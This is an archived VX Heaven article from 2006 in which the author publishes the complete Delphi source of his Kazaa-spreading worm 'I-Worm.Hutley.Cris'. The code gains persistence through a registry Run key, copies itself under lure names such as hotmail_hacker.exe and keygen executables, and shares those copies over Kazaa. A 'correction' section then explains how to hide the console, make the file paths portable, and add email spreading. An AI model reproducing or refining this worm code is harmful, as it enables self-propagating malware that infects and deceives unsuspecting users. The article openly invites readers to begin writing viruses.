<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Hutley 'Simple worm in delphi and corrections' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Hutley"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Hutley,Simple worm in delphi and corrections, cris, writestring, copyfile, files, winexec, true, result, code, path, kazaa, worm, world, hutley, string, console"/>
<meta name="Description" content="Many people know about the Interactive Disassembler. It is a great tool for disassembling many different file formats for many different CPUs. It even has a debugger now, so it can be used for all kinds of reverse-engineering, unpacking, decrypting, etc. In case that was not enough functionality, it also supports a language called IDC. In the words of Ilfak, IDC language is a C-like language. It has the same lexical tokens as C does: character set, constants, identifiers, keywords, etc. A program in IDC consists of function declarations."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"61fd65312740add865e0033581982c3d4bdfe6ef-1498757136-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vhu00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Simple worm in delphi and corrections</h1><p><a href="/lib/?lang=en&amp;author=Hutley"> Hutley</a><br/> <em><a href="/vx.php?fid=1512#f1512">Ready Rangers Liberation Front [7]</a></em><br/> <em>July 2006</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vhu00.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VX#vhu00">Back to index</a>] [<a href="/lib/vhu00.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c0">Introduction</a></li>
<li><a href="#c1">The source code</a></li>
<li><a href="#c2">An explanation</a></li>
<li><a href="#c3">The correction</a></li>
<li><a href="#c4">The end</a></li>
</ul>
<h2><a name="c0"></a>Introduction</h2>
<p>Here I will go to explain to you the code of my first worm. Totaly written in Delphi. It was my first creation of type <strong>worm</strong>, because since then I had made only one Trojan and a creator of backdoors for mirc. As I wise person very as well as would not have to be one worm, I was programming it in accordance with some things that I already had made with the Legionário Trojan - my first creation for world vx. After programmed and distributed, I decided to publish the code to have the opinion of other people who were more the time in the branch of that I.</p>
<p>At that time, I was in another group (GEDZAC), then I asked for aid to the other members so that they evaluated my code and they pointed me the errors.</p>
<p>The result was excellent. Those mans (MachineDramon, Falckon, Sr.Muerte, Pana_Infierno, DemionKlaz, and others), they had had spectacular a good will in saying me where i committed errors and which the certain method of if making so that mine worm did not lose its effectiveness.</p>
<h2><a name="c1"></a>The source code</h2>
<div class="delphi" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">program</span> porn<span style="color: #000066;">;</span><br/>
<br/>
<span style="color: #008000; font-style: italic;">{$APPTYPE CONSOLE}</span><br/>
<br/>
<span style="color: #808080; font-style: italic;">{ &nbsp; &nbsp; &nbsp; I-Worm.Hutley.Cris<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Brasil! Rulez! }</span><br/>
<br/>
<span style="color: black; font-style: italic;">// Please KAV Lab. this is I-Worm.Hutley.Cris</span><br/>
<span style="color: black; font-style: italic;">// it's the original name! Understand?</span><br/>
<span style="color: #000000; font-weight: bold;">uses</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; Windows<span style="color: #000066;">,</span> SysUtils<span style="color: #000066;">,</span> Registry<span style="color: #000066;">;</span><br/>
<br/>
<span style="color: #000000; font-weight: bold;">procedure</span> ExecutaViaRegistro<span style="color: black;">&#40;</span>nome<span style="color: #000066;">,</span> path<span style="color: #000066;">:</span> <span style="color: #000066; font-weight: bold;">string</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
<span style="color: #000000; font-weight: bold;">var</span> evrg<span style="color: #000066;">:</span> TRegistry<span style="color: #000066;">;</span><br/>
<span style="color: #000000; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; evrg <span style="color: #000066;">:</span><span style="color: #000066;">=</span> TRegistry<span style="color: #000066;">.</span><span style="color: #006600;">Create</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; evrg<span style="color: #000066;">.</span><span style="color: #006600;">RootKey</span> <span style="color: #000066;">:</span><span style="color: #000066;">=</span> HKEY_LOCAL_MACHINE<span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; evrg<span style="color: #000066;">.</span><span style="color: #006600;">OpenKey</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">FALSE</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; evrg<span style="color: #000066;">.</span><span style="color: #006600;">WriteString</span><span style="color: black;">&#40;</span>nome<span style="color: #000066;">,</span> path<span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; evrg<span style="color: #000066;">.</span><span style="color: #006600;">Destroy</span><span style="color: #000066;">;</span><br/>
<span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span><br/>
<br/>
<span style="color: #000000; font-weight: bold;">procedure</span> Kazaa<span style="color: #000066;">;</span><br/>
<span style="color: #000000; font-weight: bold;">var</span> reg<span style="color: #000066;">:</span> Tregistry<span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; Cris<span style="color: #000066;">:</span> <span style="color: #000000; font-weight: bold;">array</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">0</span><span style="color: #000066;">..</span><span style="color: #0000ff;">260</span><span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">of</span> <span style="color: #000066; font-weight: bold;">Char</span><span style="color: #000066;">;</span><br/>
<span style="color: #000000; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg <span style="color: #000066;">:</span><span style="color: #000066;">=</span> TRegistry<span style="color: #000066;">.</span><span style="color: #006600;">Create</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg<span style="color: #000066;">.</span><span style="color: #006600;">RootKey</span> <span style="color: #000066;">:</span><span style="color: #000066;">=</span> HKEY_CURRENT_USER<span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg<span style="color: #000066;">.</span><span style="color: #006600;">OpenKey</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'Software\Kazaa\LocalContent'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg<span style="color: #000066;">.</span><span style="color: #006600;">WriteString</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'DisableSharing'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'0'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg<span style="color: #000066;">.</span><span style="color: #006600;">writestring</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'dir0'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'012345:'</span> <span style="color: #000066;">+</span> <span style="color: #ff0000;">'C:\Windows\files'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg<span style="color: #000066;">.</span><span style="color: #006600;">writestring</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'dir1'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'012345:'</span> <span style="color: #000066;">+</span> <span style="color: #ff0000;">'C:\Windows\files'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg<span style="color: #000066;">.</span><span style="color: #006600;">writestring</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'dir2'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'012345:'</span> <span style="color: #000066;">+</span> <span style="color: #ff0000;">'C:\Windows\files'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg<span style="color: #000066;">.</span><span style="color: #006600;">writestring</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'dir3'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'012345:'</span> <span style="color: #000066;">+</span> <span style="color: #ff0000;">'C:\Windows\files'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg<span style="color: #000066;">.</span><span style="color: #006600;">writestring</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'dir4'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'012345:'</span> <span style="color: #000066;">+</span> <span style="color: #ff0000;">'C:\Windows\files'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; reg<span style="color: #000066;">.</span><span style="color: #006600;">writestring</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'dir5'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'012345:'</span> <span style="color: #000066;">+</span> <span style="color: #ff0000;">'C:\Windows\files'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CreateDirectory<span style="color: black;">&#40;</span><span style="color: #ff0000;">'C:\windows\files'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; GetModuleFileNameA<span style="color: black;">&#40;</span><span style="color: #0000ff;">0</span><span style="color: #000066;">,</span> Cris<span style="color: #000066;">,</span> <span style="color: #000066;">SizeOf</span><span style="color: black;">&#40;</span>Cris<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\hotmail_hacker.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\hotmail_cracker.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\hotmail_account_sniffer.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\aim_hack.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\msn_crack.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\icq_hack.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\WarDialer.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\Delphi 6 - Serial Gen.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\WinxpHack.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\Delphi 7 Crack.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\win2k_serial_gen.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\yahoo_hack.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\ftp_crack.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\XP_keygen.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\PS2_emulator_bleem.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\win2k_pass_decryptor.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\Win2k_reboot_exploit.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\IIS_ShellBind.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\WinZip_KeyGen.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\Counter Strike_CD_Keygen.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\Delphi 2005 Keygen.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\Delphi 9 Keygen.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\Half_life Cd keygen.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\Hotmail Hacker.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\ICQ_Hackingtools.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\files\invisible_IP.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
<span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span><br/>
<br/>
<span style="color: #000000; font-weight: bold;">var</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; Cris<span style="color: #000066;">:</span> <span style="color: #000000; font-weight: bold;">array</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">0</span><span style="color: #000066;">..</span><span style="color: #0000ff;">260</span><span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">of</span> <span style="color: #000066; font-weight: bold;">Char</span><span style="color: #000066;">;</span><br/>
&nbsp;<br/>
<span style="color: #000000; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; GetModuleFileNameA<span style="color: black;">&#40;</span><span style="color: #0000ff;">0</span><span style="color: #000066;">,</span> Cris<span style="color: #000066;">,</span> <span style="color: #000066;">SizeOf</span><span style="color: black;">&#40;</span>Cris<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: #000000; font-weight: bold;">not</span> <span style="color: black;">&#40;</span><span style="color: #000066;">FileExists</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'C:\Windows\WinExec.exe'</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #000000; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\WinExec.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ExecutaViaRegistro<span style="color: black;">&#40;</span><span style="color: #ff0000;">'WinExec'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\WinExec.exe'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">end</span> <span style="color: #000000; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ExecutaViaRegistro<span style="color: black;">&#40;</span><span style="color: #ff0000;">'WinExec'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\WinExec.exe'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; Kazaa<span style="color: #000066;">;</span><br/>
<span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">.</span><br/>
&nbsp;</div>
<h2><a name="c2"></a>An explanation</h2>
<p>What this worm makes is only if auto to copy for a folder created for he himself. When it is copied using several other names, it it has access to the register of the system and makes with that this folder is shared by the KAZAA. It also creates only one copy of itself in the folder of windows, and writes in the register so that all time is executed that windows will be initiated.</p>
<h2><a name="c3"></a>The correction</h2>
<p><strong>1 - {$APPTYPE CONSOLE}</strong></p>
<p>This stretch, in Delphi, is called "directive compilation". Removing this directive one, it makes with that the window console does not appear. The correct one is to remove it</p>
<p><strong>2 - CopyFile(Cris, 'C:\Windows\files\hotmail_hacker.exe', True);</strong></p>
<p>This line of command possesss a good idea, but its effectiveness is engaged.</p>
<p>For two reasons it is engaged. First - It copies itself for a folder that will be add as shared for the KAZAA, this implies where, if the user will not have the KAZAA worm will not go to spread itself. Second - as you already must have noticed, the complete way of the archive already you are placed, this you compromise worm if the user will have windows installed for example in unit E:.</p>
<p>The way to kill these two problems would be, to place the auto possibility of if also propagating for email and other programs of P2P. How much to the problem of the complete way, it is necessary to add to the code a function that will go to return the folder from windows, ai is enough to add "files\hotmail_hacker.exe" and ready, this problem is decided. It sees the function that returns the folder from windows.</p>
<div class="delphi" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">function</span> WinDir<span style="color: #000066;">:</span> <span style="color: #000066; font-weight: bold;">string</span><span style="color: #000066;">;</span><br/>
<span style="color: #000000; font-weight: bold;">begin</span><br/>
&nbsp; <span style="color: #000066;">SetLength</span><span style="color: black;">&#40;</span>Result<span style="color: #000066;">,</span> MAX_PATH<span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; Windows<span style="color: #000066;">.</span><span style="color: #006600;">GetWindowsDirectory</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">PChar</span><span style="color: black;">&#40;</span>Result<span style="color: black;">&#41;</span><span style="color: #000066;">,</span> MAX_PATH<span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp; Result <span style="color: #000066;">:</span><span style="color: #000066;">=</span> <span style="color: #000066; font-weight: bold;">string</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">PChar</span><span style="color: black;">&#40;</span>Result<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #000066;">+</span> <span style="color: #ff0000;">'\'</span><span style="color: #000066;">;</span><br/>
<span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span><br/>
&nbsp;</div>
<p>With this function in the code, that one same line of command would be thus:</p>
<div class="delphi" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">CopyFile<span style="color: black;">&#40;</span>Cris<span style="color: #000066;">,</span> WinDir <span style="color: #000066;">+</span> <span style="color: #ff0000;">'files\hotmail_hacker.exe'</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">True</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp;</div>
<p>The same thing if applies the commands:</p>
<div class="delphi" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">reg<span style="color: #000066;">.</span><span style="color: #006600;">writestring</span><span style="color: black;">&#40;</span><span style="color: #ff0000;">'dir0'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'012345:'</span> <span style="color: #000066;">+</span> <span style="color: #ff0000;">'C:\Windows\files'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp;</div>
<p>and too the:</p>
<div class="delphi" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">ExecutaViaRegistro<span style="color: black;">&#40;</span><span style="color: #ff0000;">'WinExec'</span><span style="color: #000066;">,</span> <span style="color: #ff0000;">'C:\Windows\WinExec.exe'</span><span style="color: black;">&#41;</span><span style="color: #000066;">;</span><br/>
&nbsp;</div>
<h2><a name="c4"></a>The end</h2>
<p>These are the biggest problems of this worm basic that one day I broke the head to develop. I wait to have helped in the initiation of plus some coders for this wonderful world that is of the creation of virus/worms/trojans.</p>
<p>With world vx diminishing each time more, I believe to be important to make beginning basic articles for with a language of easy learning and high level as delphi is.</p>
<p>This is all staff.</p>
<p>Suggestions, critics: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="49213c3d252c303f31092e24282025672a2624">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> - www.hutley.cjb.net</p>
<div id="disqus_thread"></div>
